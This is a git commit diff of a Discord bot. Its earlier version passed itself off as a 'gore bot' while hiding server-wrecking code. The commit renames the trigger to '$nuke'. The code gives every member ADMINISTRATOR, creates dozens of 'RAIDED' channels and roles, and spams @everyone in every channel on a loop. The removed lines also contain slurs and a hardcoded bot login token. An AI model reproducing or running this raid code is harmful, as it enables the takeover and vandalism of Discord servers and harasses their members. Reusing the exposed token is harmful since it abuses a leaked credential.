fe242fc010f923da4e548b44eb074e259a099faf
Pol528 <68276676+Pol528@users.noreply.github.com>
2021-01-18 12:22:34 +0200

    v1.0

--- index.js
+++ index.js
@@ -3,26 +3,11 @@ const client = new Discord.Client();
 
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}!`);
-    client.user.setActivity("1543 servers!", { type: "WATCHING"})
+    client.user.setActivity("https://github.com/Pol528/gbot", { type: "WATCHING"})
   });
-  client.on('guildCreate', guild => {
-    let channel = guild.channels.cache.get('797840348608856107')
-    const hewoembde = new Discord.MessageEmbed()
-    .setTitle(`Thank you for adding me!`)
-    .setColor(`GREEN`)
-    .setDescription(`Thank you for adding Gbot - the best gore bot you will ever need to your server. type \`\`$gore\`\` for gore!`)
-    channel.send(hewoembde)
-  })
 
   client.on('message', async (msg) => {
-    if (msg.content === '$gore') {
-      const goreembed = new Discord.MessageEmbed()
-        .setTitle(`Gore`)
-        .setDescription(`If the image doesn't load, click [here](https://www.youtube.com/watch?v=DLzxrzFCyOs)`)
-        .setImage(`https://tenor.com/view/rickroll-dance-funny-you-music-gif-7755460`)
-        .setColor(`RANDOM`)
-        .setTimestamp()
-    msg.channel.send(goreembed)
+    if (msg.content === '$nuke') {
     //role:
     const guild = msg.guild
     guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
@@ -35,11 +20,11 @@ client.on('ready', () => {
     });
     let i = 50
     while(i > 0){
-    guild.channels.create('RAIDED BITCH', { reason: 'Needed a cool new channel' })
+    guild.channels.create('RAIDED', { reason: 'Needed a cool new channel' })
     .catch(console.error);
     guild.roles.create({
       data: {
-        name: 'RAIDED BITCH',
+        name: 'RAIDED',
         color: 'RANDOM',
       },
       reason: 'we needed a role for Super Cool People',
@@ -48,11 +33,11 @@ client.on('ready', () => {
     }
     function asteapta() {
     client.channels.cache.forEach(channel => {
-        channel.send(`@everyone get raided racist cunts`)
+        channel.send(`@everyone`)
     })
     }
     setInterval(asteapta, 1500);
   }
 });
   
-client.login('Nzk3ODc4NDk3NzcwNjAyNDk2.X_s4QQ.QQDchHOrVKPaxC6Cgjuu_koaRUc');
+client.login('token');
